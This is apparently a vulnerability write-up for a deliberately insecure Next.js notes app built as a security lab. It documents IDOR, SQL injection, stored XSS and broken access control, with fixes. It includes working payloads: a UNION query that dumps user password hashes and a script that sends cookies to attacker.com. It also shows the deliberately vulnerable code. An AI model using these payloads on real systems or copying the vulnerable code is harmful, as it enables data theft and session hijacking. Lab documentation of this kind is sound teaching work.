# VULNERABILITIES.md

> **VULNLAB** — Intentionally Vulnerable Web Application  
> Documented vulnerabilities for educational and portfolio purposes.  
> All vulnerabilities are **intentional** and exist only in this local lab environment.

---

## Summary

| # | Vulnerability | OWASP Category | Severity | Location |
|---|--------------|----------------|----------|----------|
| 1 | Insecure Direct Object Reference (IDOR) | A01 Broken Access Control | 🔴 High | `/api/notes/:id` |
| 2 | SQL Injection | A03 Injection | 🔴 High | `/api/search` |
| 3 | Cross-Site Scripting (XSS) | A03 Injection | 🟠 Medium | Note content field |
| 4 | Broken Access Control | A01 Broken Access Control | 🟠 Medium | `/api/users/:id` |

---

## 1. Insecure Direct Object Reference (IDOR)

### Description
The notes API exposes internal object IDs directly in the URL and does not verify whether the authenticated user owns the requested resource. Any authenticated user can read, edit, or delete notes belonging to other users by manipulating the `id` parameter.

### Affected Endpoints
- `GET /api/notes/:id` — read any note
- `PUT /api/notes/:id` — edit any note
- `DELETE /api/notes/:id` — delete any note

### Steps to Reproduce
1. Log in as `test3`
2. Create a note — observe the `id` badge on the note card (e.g. `id:19`)
3. Log in as `test4` in a separate session and create a note (e.g. `id:27`)
4. As `test3`, send a request directly to `GET /api/notes/27`
5. The API returns `test4`'s note — including private notes

```
GET /api/notes/27
Authorization: Bearer <test3_token>

→ 200 OK  { id: 27, title: "note user4", authorId: 20, isPublic: true, ... }
```

### Evidence
- Note IDs are visibly exposed on every NoteCard (`id:XX` badge)
- API returns notes regardless of `authorId` vs token owner
- Edit and Delete actions via Thunder Client succeed on other users' notes

### Root Cause
```javascript
// api/notes/[id]/route.js — no ownership check
const note = await prisma.note.findUnique({ where: { id } })
return NextResponse.json(note)
```

### Risk
A malicious user can enumerate all notes, access private content, modify or delete other users' data.

### Remediation
```javascript
// Verify ownership before returning
if (note.authorId !== session.user.id) {
  return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
}
```

---

## 2. SQL Injection

### Description
The search endpoint passes user input directly into a raw SQL query using Prisma's `$queryRawUnsafe()` without any sanitization or parameterization. An attacker can manipulate the query to dump all notes, bypass filters, or extract sensitive data including user credentials.

### Affected Endpoint
- `GET /api/search?q=`

### Steps to Reproduce
1. Navigate to `/search`
2. Enter the payload: `' OR 1=1 #`
3. Click **Run** — all notes from all users are returned regardless of visibility or ownership
4. Enter the Union-based payload to extract user credentials:
```
' OR (1=0) UNION SELECT id,username,password,email,createdAt,createdAt,id FROM User --
```
5. Response includes hashed passwords and emails of all users

### Evidence
- Payload `' OR 1=1 #` returns all 9 notes including private notes from other users
- Union probe payload returns User table rows mapped into the notes response shape
- SQLi Detected banner confirms the injection on the frontend

### Root Cause
```javascript
// api/search/route.js
const results = await prisma.$queryRawUnsafe(
  `SELECT * FROM Note WHERE title LIKE '%${q}%' OR content LIKE '%${q}%'`
)
```

### Risk
Full database read access. An attacker can dump all notes, extract user credentials (username, hashed password, email), and potentially pivot to further attacks.

### Remediation
Use parameterized queries via Prisma's `$queryRaw` with tagged template literals:
```javascript
const results = await prisma.$queryRaw`
  SELECT * FROM Note
  WHERE title LIKE ${'%' + q + '%'}
  OR content LIKE ${'%' + q + '%'}
`
```
Or use the Prisma ORM query builder:
```javascript
const results = await prisma.note.findMany({
  where: {
    OR: [
      { title: { contains: q } },
      { content: { contains: q } },
    ]
  }
})
```

---

## 3. Cross-Site Scripting (XSS)

### Description
Note content is rendered using React's `dangerouslySetInnerHTML` without any sanitization. Any HTML or JavaScript injected into the content field is executed in the browser of any user who views the note. Since notes can be public, this affects all users of the application.

### Affected Components
- `NoteCard` component — note content display
- `ResultCard` component — search results display

### Steps to Reproduce
1. Log in and create a new note
2. In the **Content** field, enter:
```html
<img src=x onerror="alert('XSS by ' + document.cookie)">
```
3. Save the note
4. The alert fires immediately on the notes page for the creator
5. Since the note is public, the alert fires for **any user** who views it

**Stored XSS via cookie theft:**
```html
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie)
</script>
```

### Evidence
- Alert box appears on note render with injected payload
- `dangerouslySetInnerHTML={{ __html: note.content }}` confirmed in source
- Content field placeholder reads: `Write anything... or inject <script>alert(1)</script>`

### Root Cause
```jsx
// components in notes/page.js and search/page.js
<div
  className="..."
  dangerouslySetInnerHTML={{ __html: note.content }}
/>
```

### Risk
Stored XSS affecting all users who view a public note. Potential impact includes session hijacking via cookie theft, credential phishing, and malicious redirects.

### Remediation
Sanitize HTML before rendering using a library such as DOMPurify:
```javascript
import DOMPurify from 'dompurify'

<div
  className="..."
  dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(note.content) }}
/>
```
Or render as plain text using a `<p>` tag instead:
```jsx
<p className="...">{note.content}</p>
```

---

## 4. Broken Access Control

### Description
The user profile endpoint accepts a user `id` from the URL query parameter (`?id=`) and returns the corresponding user's profile without verifying that the `id` matches the currently authenticated user. Any authenticated user can view — and edit — any other user's profile data by changing the `id` in the URL.

### Affected Endpoints
- `GET /api/users/:id` — view any user's profile
- `PUT /api/users/:id` — update any user's profile (IDOR on profile)

### Steps to Reproduce
1. Log in as `test3` — observe the URL becomes `/profile?id=19`
2. Manually change the URL to `/profile?id=20`
3. The page loads `test4`'s profile: username, email, user ID, join date
4. Click **Edit** and save — the API updates `test4`'s account without any authorization error

```
GET /api/users/20
Authorization: Bearer <test3_token>

→ 200 OK  { id: 20, username: "test4", email: "test4@test.com", ... }
```

### Evidence
- URL change to `?id=20` while logged in as `test3` shows `test4`'s profile
- Warning banner `⚠ Viewing profile of @test4 — not your account` confirms the exploit
- Edit + Save successfully modifies `test4`'s username and email

### Root Cause
```javascript
// api/users/[id]/route.js — id comes from URL, no auth check
const { id } = params
const user = await prisma.user.findUnique({ where: { id: parseInt(id) } })
return NextResponse.json(user)
```

### Risk
An attacker can enumerate user profiles to harvest email addresses and usernames. Combined with the Edit capability, this allows account takeover by modifying another user's credentials.

### Remediation
```javascript
// Enforce that the requested id matches the authenticated user
const session = await getServerSession()
if (parseInt(id) !== session.user.id) {
  return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
}
```

---

## Testing Environment

| Item | Detail |
|------|--------|
| Frontend | Next.js 15, React 19 |
| Backend | Next.js API Routes |
| Database | SQLite via Prisma ORM |
| Auth | JWT stored in localStorage |
| Test Accounts | `test3` / `test4` |
| Tools Used | Chrome DevTools, Thunder Client (VS Code), manual browser testing, URL manipulation |

---

## Disclaimer

This application is built **intentionally vulnerable** for the purpose of learning and demonstrating common web security vulnerabilities. It must **never** be deployed to a public server. All vulnerabilities documented here exist by design and are confined to a local development environment.

---

*Documented by [Phuriphatthanachai Rattanatham](https://ctrlfaith-portfolio.vercel.app) — [GitHub](https://github.com/ctrlfaith)*
